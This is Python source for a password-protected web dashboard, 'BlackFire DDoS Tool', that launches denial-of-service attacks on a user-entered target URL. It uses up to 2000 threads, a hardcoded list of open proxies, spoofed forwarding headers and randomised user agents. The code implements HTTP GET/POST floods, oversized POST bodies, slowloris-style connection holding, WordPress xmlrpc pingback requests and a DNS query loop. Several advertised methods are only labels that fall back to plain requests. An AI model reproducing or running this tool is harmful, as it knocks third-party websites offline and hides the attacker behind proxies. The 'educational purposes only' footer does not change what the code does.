from flask import Flask, jsonify, request, render_template_string, redirect, url_for, session
import requests
import threading
import urllib3
import time
import random
from fake_useragent import UserAgent
from functools import wraps
from bs4 import BeautifulSoup
import base64
import socket
import os
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import json
import dns.resolver
import ipaddress

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ua = UserAgent()


default_proxies = [
    "103.75.117.85:80", "124.6.40.248:8080", "13.208.56.180:80",
    "13.213.114.238:3128", "13.234.24.116:80", "13.36.104.85:80",
    "13.37.59.99:3128", "13.37.59.99:80", "13.38.153.36:80",
    "13.56.192.187:80", "15.236.106.236:3128", "157.20.50.238:8080",
    "18.228.198.164:80", "184.169.154.119:80", "185.235.16.12:80",
    "188.68.52.244:80", "195.234.62.100:80", "204.236.137.68:80",
    "3.123.150.192:80", "3.124.133.93:3128", "3.124.133.93:80",
    "3.127.121.101:80", "3.127.62.252:80", "3.130.65.162:80",
    "3.21.101.158:3128", "3.21.101.158:80", "3.78.92.159:3128",
    "3.97.167.115:3128", "34.81.72.31:80", "35.72.118.126:80",
    "43.200.77.128:3128", "43.201.121.81:80", "44.218.183.55:80",
    "46.51.249.135:3128", "47.238.128.246:9098", "47.88.59.79:82",
    "51.16.199.206:3128", "51.20.19.159:3128", "51.20.50.149:3128",
    "52.16.232.164:3128", "52.26.114.229:1080", "52.63.129.110:3128",
    "52.65.193.254:3128", "54.179.39.14:3128", "54.228.164.102:3128",
    "54.233.119.172:3128", "59.53.80.122:10024", "60.187.245.153:8085",
    "63.35.64.177:3128", "65.1.244.232:1080", "83.168.74.163:8080",
    "84.39.112.144:3128", "93.171.157.249:8080", "103.67.163.105:10230",
    "112.91.141.213:9002", "115.239.234.43:7302", "119.3.113.150:9094",
    "119.3.113.152:9094", "13.246.209.48:1080", "13.37.73.214:3128",
    "13.37.73.214:80", "13.37.89.201:3128", "13.37.89.201:80",
    "13.59.156.167:3128", "133.232.89.179:80", "146.190.143.248:8888",
    "149.129.226.9:80", "15.156.24.206:3128", "158.255.77.166:80",
    "158.255.77.169:80", "16.16.239.39:3128", "16.163.88.228:80",
    "179.60.53.28:999", "18.135.133.116:1080", "18.228.149.161:80",
    "20.13.148.109:8080", "201.77.96.0:999", "203.19.38.114:1080",
    "204.236.176.61:3128", "206.238.220.148:8888", "218.77.183.214:5224",
    "221.231.13.198:1080", "24.199.113.48:8888", "3.122.84.99:3128",
    "3.129.184.210:80", "3.139.242.184:80", "3.141.217.225:3128",
    "3.212.148.199:3128", "3.212.148.199:80", "3.71.239.218:3128",
    "3.9.71.167:3128", "3.90.100.12:80", "3.97.176.251:3128",
    "35.79.120.242:3128", "37.46.241.247:80", "4.175.200.138:8080",
    "41.59.90.171:80", "43.153.4.199:13001", "43.153.62.242:13001",
    "45.168.237.194:999", "46.47.197.210:3128", "47.250.11.111:9080",
    "47.251.74.38:3128", "47.89.159.212:8123", "47.91.121.127:8888",
    "47.91.89.3:35", "49.51.73.95:13001", "5.45.126.128:8080",
    "51.16.179.113:1080", "52.13.248.29:1080", "52.196.1.182:80",
    "52.73.224.54:3128", "54.212.22.168:80", "63.32.1.88:3128",
    "64.23.207.76:8888", "79.110.201.235:8081", "8.211.51.115:9098",
    "8.212.165.164:3128", "8.220.136.174:12000", "8.221.138.111:9080",
    "80.249.112.166:80", "81.169.213.169:8888", "85.215.64.49:80",
    "87.248.129.26:80", "90.52.80.102:8888", "91.107.187.112:80",
    "95.66.244.250:8080", "97.74.87.226:80", "99.80.11.54:3128"
]


MAX_THREADS = 2000
CONNECTION_TIMEOUT = 5
REQUEST_TIMEOUT = 15
STATS_UPDATE_INTERVAL = 3

targets = []
active_attacks = [] 
stats = {
    "requests_sent": 0,
    "successful": 0,
    "failed": 0,
    "bytes_sent": 0,
    "start_time": None,
    "targets": {},
    "attack_type": None
}
threads_info = {}
lock = threading.Lock()
proxies = default_proxies.copy()
use_proxy = False
attack_active = False
executor = ThreadPoolExecutor(max_workers=MAX_THREADS)


main_loop = asyncio.new_event_loop()


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function


def generate_headers():
    rand_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    return {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "ar,en-US;q=0.9,en;q=0.8"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate"]),
        "Connection": random.choice(["keep-alive", "close"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "Pragma": "no-cache",
        "X-Forwarded-For": rand_ip,
        "X-Real-IP": rand_ip,
        "Referer": random.choice([
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.yahoo.com/",
            "https://www.facebook.com/",
            "https://www.youtube.com/"
        ]),
        "DNT": random.choice(["1", "0"]),
        "Upgrade-Insecure-Requests": "1"
    }


def generate_large_packet(size_kb=100):
    size = size_kb * 1024
    return base64.b64encode(os.urandom(size)).decode('utf-8')


ATTACK_METHODS = {
    "http_flood": "HTTP Flood",
    "pkg": "Large Packet Attack",
    "slowloris": "Slowloris",
    "udp": "UDP Flood",
    "dns": "DNS Amplification",
    "goldeneye": "GoldenEye",
    "gsb": "Google Safe Browsing",
    "wordpress": "WordPress Pingback",
    "tcp_syn": "TCP SYN Flood",
    "http_get": "HTTP GET Flood",
    "http_post": "HTTP POST Flood",
    "icmp": "ICMP Flood",
    "ntp": "NTP Amplification",
    "memcached": "Memcached",
    "ssl": "SSL/TLS Flood",
    "slow_read": "Slow Read",
    "slow_post": "Slow POST",
    "xmlrpc": "XML-RPC Pingback",
    "ping": "Ping Flood",
    "teardrop": "Teardrop",
    "land": "LAND Attack"
}


async def execute_attack(session, url, attack_type):
    try:
        headers = generate_headers()
        proxy = random.choice(proxies) if use_proxy and proxies else None
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        
        if attack_type == "pkg":
            data = generate_large_packet(random.randint(50, 500))
            async with session.post(url, headers=headers, data=data, proxy=proxy_dict, 
                                   ssl=False, timeout=REQUEST_TIMEOUT) as response:
                return response.status
                
        elif attack_type == "slowloris":
            async with session.get(url, headers=headers, proxy=proxy_dict, 
                                 ssl=False, timeout=None) as response:
                while any(a['url'] == url for a in active_attacks):
                    await asyncio.sleep(random.randint(5, 15))
                return response.status
                
        elif attack_type == "gsb":
            gsb_url = f"https://transparencyreport.google.com/safe-browsing/search?url={url}"
            async with session.get(gsb_url, headers=headers, proxy=proxy_dict,
                                 ssl=False, timeout=REQUEST_TIMEOUT) as response:
                return response.status
                
        elif attack_type == "wordpress":
            pingback_url = f"{url}/xmlrpc.php"
            data = f"""<?xml version="1.0"?>
                <methodCall>
                    <methodName>pingback.ping</methodName>
                    <params>
                        <param><value><string>http://example.com/target</string></value></param>
                        <param><value><string>{url}/</string></value></param>
                    </params>
                </methodCall>"""
            async with session.post(pingback_url, headers=headers, data=data,
                                 proxy=proxy_dict, ssl=False, timeout=REQUEST_TIMEOUT) as response:
                return response.status
                
        elif attack_type == "http_get":
            async with session.get(url, headers=headers, proxy=proxy_dict,
                                ssl=False, timeout=REQUEST_TIMEOUT) as response:
                return response.status
                
        elif attack_type == "http_post":
            data = generate_large_packet(random.randint(1, 10))
            async with session.post(url, headers=headers, data=data, proxy=proxy_dict,
                                 ssl=False, timeout=REQUEST_TIMEOUT) as response:
                return response.status
                
        else:  
            async with session.get(url, headers=headers, proxy=proxy_dict,
                                ssl=False, timeout=REQUEST_TIMEOUT) as response:
                return response.status
                
    except Exception as e:
        return None


async def dns_amplification(target_ip, dns_server="8.8.8.8"):
    try:
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [dns_server]
        
        query = dns.message.make_query("example.com", dns.rdatatype.ANY)
        query.flags |= dns.flags.RD
        
        while True:
            dns.query.udp(query, target_ip, timeout=5)
            with lock:
                stats["requests_sent"] += 1
                stats["successful"] += 1
    except:
        with lock:
            stats["failed"] += 1


async def goldeneye_attack(session, url):
    try:
        headers = generate_headers()
        headers.update({
            "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Pragma": "no-cache"
        })
        
        proxy = random.choice(proxies) if use_proxy and proxies else None
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        
        async with session.get(url, headers=headers, proxy=proxy_dict,
                             ssl=False, timeout=REQUEST_TIMEOUT) as response:
            return response.status
    except:
        return None


async def run_attack(url, attack_type):
    async with aiohttp.ClientSession() as session:
        while any(a['url'] == url and a['type'] == attack_type for a in active_attacks):
            try:
                if attack_type == "dns":
                    await dns_amplification(url)
                elif attack_type == "goldeneye":
                    status = await goldeneye_attack(session, url)
                else:
                    status = await execute_attack(session, url, attack_type)
                
                with lock:
                    stats["requests_sent"] += 1
                    if status:
                        stats["successful"] += 1
                        key = f"{url} [{status}]"
                        stats["targets"].setdefault(key, 0)
                        stats["targets"][key] += 1
                    else:
                        stats["failed"] += 1
            except:
                with lock:
                    stats["failed"] += 1
            await asyncio.sleep(0.01)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        if username == 'BlackFire' and password == 'UltraDDoS123':
            session['logged_in'] = True
            return redirect('/')
        return render_template_string('''
            <html><head>
                <title>BlackFire - Login</title>
                <style>
                    body { background: #111; color: #0f0; font-family: 'Courier New', monospace; }
                    .login-box { width: 350px; margin: 100px auto; border: 1px solid #0f0; padding: 30px; box-shadow: 0 0 20px #0f0; }
                    input { width: 100%; padding: 12px; margin: 10px 0; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 4px; }
                    button { background: #0f0; color: #000; padding: 12px; width: 100%; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
                    .error { color: #f00; margin-top: 10px; }
                    h2 { text-align: center; margin-bottom: 20px; color: #0f0; text-shadow: 0 0 10px #0f0; }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h2>BLACKFIRE DDoS</h2>
                    <form method="post">
                        <input name="username" placeholder="Username" required>
                        <input name="password" type="password" placeholder="Password" required>
                        <button type="submit">LOGIN</button>
                        <p class="error">Invalid credentials!</p>
                    </form>
                </div>
            </body></html>
        ''')
    return render_template_string('''
        <html><head>
            <title>BlackFire - Login</title>
            <style>
                body { background: #111; color: #0f0; font-family: 'Courier New', monospace; }
                .login-box { width: 350px; margin: 100px auto; border: 1px solid #0f0; padding: 30px; box-shadow: 0 0 20px #0f0; }
                input { width: 100%; padding: 12px; margin: 10px 0; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 4px; }
                button { background: #0f0; color: #000; padding: 12px; width: 100%; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
                h2 { text-align: center; margin-bottom: 20px; color: #0f0; text-shadow: 0 0 10px #0f0; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>BLACKFIRE DDoS</h2>
                <form method="post">
                    <input name="username" placeholder="Username" required>
                    <input name="password" type="password" placeholder="Password" required>
                    <button type="submit">LOGIN</button>
                </form>
            </div>
        </body></html>
    ''')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/')
@login_required
def dashboard():
    return render_template_string('''
    <html>
    <head>
        <title>BlackFire - Advanced DDoS Tool</title>
        <style>
            :root {
                --primary: #0f0;
                --secondary: #111;
                --background: #000;
                --text: #0f0;
                --danger: #f00;
                --warning: #ff0;
            }
            
            body {
                background: var(--background);
                color: var(--text);
                font-family: 'Courier New', monospace;
                margin: 0;
                padding: 0;
            }
            
            .container {
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px;
            }
            
            .header {
                border-bottom: 1px solid var(--primary);
                padding-bottom: 15px;
                margin-bottom: 30px;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            
            .header h1 {
                color: var(--primary);
                margin: 0;
                text-shadow: 0 0 10px var(--primary);
            }
            
            .header p {
                margin: 5px 0 0;
                color: #555;
            }
            
            .logout-btn {
                color: var(--danger);
                text-decoration: none;
                font-weight: bold;
            }
            
            .panel {
                border: 1px solid var(--primary);
                margin-bottom: 30px;
                padding: 20px;
                background: var(--secondary);
                box-shadow: 0 0 15px rgba(0, 255, 0, 0.1);
                border-radius: 5px;
            }
            
            .panel-title {
                color: var(--primary);
                margin-top: 0;
                border-bottom: 1px solid #333;
                padding-bottom: 10px;
            }
            
            table {
                width: 100%;
                border-collapse: collapse;
                margin-top: 15px;
            }
            
            th, td {
                padding: 12px;
                text-align: left;
                border-bottom: 1px solid #333;
            }
            
            th {
                background: rgba(0, 255, 0, 0.1);
                color: var(--primary);
            }
            
            tr:hover {
                background: rgba(0, 255, 0, 0.05);
            }
            
            button {
                background: var(--primary);
                color: #000;
                border: none;
                padding: 10px 20px;
                cursor: pointer;
                font-weight: bold;
                border-radius: 4px;
                transition: all 0.3s;
            }
            
            button:hover {
                background: #0d0;
                box-shadow: 0 0 10px var(--primary);
            }
            
            button.danger {
                background: var(--danger);
                color: #fff;
            }
            
            button.danger:hover {
                background: #d00;
                box-shadow: 0 0 10px var(--danger);
            }
            
            input, select {
                width: 100%;
                padding: 12px;
                margin-bottom: 15px;
                background: #222;
                color: var(--text);
                border: 1px solid var(--primary);
                border-radius: 4px;
            }
            
            .stats {
                font-family: monospace;
                white-space: pre;
                background: #111;
                padding: 15px;
                border-radius: 4px;
                overflow-x: auto;
                max-height: 300px;
                overflow-y: auto;
            }
            
            .copyright {
                margin-top: 30px;
                text-align: center;
                font-size: 12px;
                color: #555;
            }
            
            .attack-types {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                gap: 15px;
                margin-bottom: 20px;
            }
            
            .attack-type {
                border: 1px solid #333;
                padding: 15px;
                cursor: pointer;
                transition: all 0.3s;
                border-radius: 4px;
                text-align: center;
            }
            
            .attack-type:hover {
                border-color: var(--primary);
                background: rgba(0, 255, 0, 0.1);
            }
            
            .attack-type.active {
                border-color: var(--primary);
                background: var(--primary);
                color: #000;
                font-weight: bold;
                box-shadow: 0 0 10px var(--primary);
            }
            
            .attack-type strong {
                display: block;
                margin-bottom: 5px;
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            label {
                display: block;
                margin-bottom: 8px;
                color: var(--primary);
            }
            
            .checkbox-label {
                display: flex;
                align-items: center;
                margin-bottom: 15px;
            }
            
            .checkbox-label input {
                width: auto;
                margin-right: 10px;
                margin-bottom: 0;
            }
            
            .status-badge {
                display: inline-block;
                padding: 3px 8px;
                border-radius: 12px;
                font-size: 12px;
                font-weight: bold;
            }
            
            .status-active {
                background: var(--primary);
                color: #000;
            }
            
            .status-inactive {
                background: #333;
                color: #999;
            }
            
            .target-url {
                max-width: 300px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }
            
            .actions-cell {
                display: flex;
                gap: 10px;
            }
            
            @media (max-width: 768px) {
                .container {
                    padding: 10px;
                }
                
                .attack-types {
                    grid-template-columns: 1fr;
                }
            }
        </style>
        <script>
            function updateStats() {
                fetch('/stats').then(r => r.json()).then(data => {
                    document.getElementById('stats').innerText = JSON.stringify(data, null, 2);
                });
            }
            setInterval(updateStats, 2000);
            
            function setAttackType(type) {
                document.querySelectorAll('.attack-type').forEach(el => {
                    el.classList.remove('active');
                });
                document.querySelector(`.attack-type[data-type="${type}"]`).classList.add('active');
                document.getElementById('attack_type').value = type;
            }
        </script>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div>
                    <h1>BLACKFIRE DDoS TOOL</h1>
                    <p>Advanced Distributed Denial of Service Platform</p>
                </div>
                <a href="/logout" class="logout-btn">LOGOUT</a>
            </div>
            
            <div class="panel">
                <h2 class="panel-title">CURRENT TARGETS</h2>
                <table>
                    <thead>
                        <tr>
                            <th>URL</th>
                            <th>Attack Type</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for attack in active_attacks %}
                        <tr>
                            <td class="target-url" title="{{ attack.url }}">{{ attack.url }}</td>
                            <td>{{ attack.type }}</td>
                            <td>
                                <span class="status-badge status-active">ACTIVE</span>
                            </td>
                            <td class="actions-cell">
                                <form method="post" action="/remove" style="display:inline;">
                                    <input type="hidden" name="url" value="{{ attack.url }}">
                                    <input type="hidden" name="attack_type" value="{{ attack.type }}">
                                    <button type="submit" class="danger">STOP</button>
                                </form>
                            </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
            
            <div class="panel">
                <h2 class="panel-title">LAUNCH NEW ATTACK</h2>
                <form method="post" action="/add">
                    <div class="form-group">
                        <label for="url">Target URL</label>
                        <input type="url" id="url" name="url" placeholder="https://example.com" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="threads">Threads</label>
                        <input type="number" id="threads" name="threads" placeholder="250" min="1" max="10000">
                    </div>
                    
                    <div class="form-group">
                        <label>Attack Type</label>
                        <div class="attack-types">
                            {% for method, desc in attack_methods.items() %}
                            <div class="attack-type {% if method == 'http_flood' %}active{% endif %}" 
                                 data-type="{{ method }}" onclick="setAttackType('{{ method }}')">
                                <strong>{{ desc }}</strong>
                                <small>{{ method }}</small>
                            </div>
                            {% endfor %}
                        </div>
                        <input type="hidden" id="attack_type" name="attack_type" value="http_flood">
                    </div>
                    
                    <div class="checkbox-label">
                        <input type="checkbox" id="proxy" name="proxy" {% if use_proxy %}checked{% endif %}>
                        <label for="proxy">Use Proxy Rotation</label>
                    </div>
                    
                    <button type="submit">LAUNCH ATTACK</button>
                </form>
            </div>
            
            <div class="panel">
                <h2 class="panel-title">ATTACK STATISTICS</h2>
                <div class="stats" id="stats">{{ stats|tojson|safe }}</div>
            </div>
            
            <div class="panel">
                <h2 class="panel-title">PROXY MANAGEMENT</h2>
                <form method="post" action="/add_proxy">
                    <div class="form-group">
                        <label for="proxy">Add Proxy</label>
                        <input type="text" id="proxy" name="proxy" placeholder="ip:port" required>
                    </div>
                    <button type="submit">ADD PROXY</button>
                </form>
                <form method="post" action="/reset_proxies" style="margin-top: 15px;">
                    <button type="submit" class="danger">RESET TO DEFAULT</button>
                </form>
            </div>
            
            <div class="copyright">
                <p>BLACKFIRE DDoS TOOL &copy; 2023 - FOR EDUCATIONAL PURPOSES ONLY</p>
                <p>UNAUTHORIZED USE AGAINST TARGETS WITHOUT PERMISSION IS ILLEGAL</p>
            </div>
        </div>
    </body>
    </html>
    ''', active_attacks=active_attacks, stats=stats, attack_methods=ATTACK_METHODS, use_proxy=use_proxy)


@app.route('/add', methods=['POST'])
@login_required
def add_target():
    url = request.form.get('url')
    threads_str = request.form.get('threads', '250')
    threads = int(threads_str) if threads_str.isdigit() else 250
    attack_type = request.form.get('attack_type', 'http_flood')
    
    global use_proxy
    use_proxy = 'proxy' in request.form
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    

    attack_id = f"{url}_{attack_type}"
    if not any(a['url'] == url and a['type'] == attack_type for a in active_attacks):
        active_attacks.append({'url': url, 'type': attack_type})
        
        
        for _ in range(min(threads, MAX_THREADS)):
            threading.Thread(target=lambda: asyncio.run(run_attack(url, attack_type)), daemon=True).start()
    
    stats["attack_type"] = ATTACK_METHODS.get(attack_type, "Unknown")
    return redirect('/')

@app.route('/remove', methods=['POST'])
@login_required
def remove_target():
    url = request.form.get('url')
    attack_type = request.form.get('attack_type')
  
    active_attacks[:] = [a for a in active_attacks if not (a['url'] == url and a['type'] == attack_type)]
    return redirect('/')

@app.route('/add_proxy', methods=['POST'])
@login_required
def add_proxy():
    proxy = request.form.get('proxy')
    if proxy and proxy not in proxies:
        proxies.append(proxy)
    return redirect('/')

@app.route('/reset_proxies', methods=['POST'])
@login_required
def reset_proxies():
    global proxies
    proxies = default_proxies.copy()
    return redirect('/')

@app.route('/stats')
@login_required
def get_stats():
    return jsonify(stats)

def run_flask_app():
    stats["start_time"] = time.time()
    app.run(host='0.0.0.0', port=5000, threaded=True)

if __name__ == '__main__':
    
    threading.Thread(target=main_loop.run_forever, daemon=True).start()
    

    run_flask_app()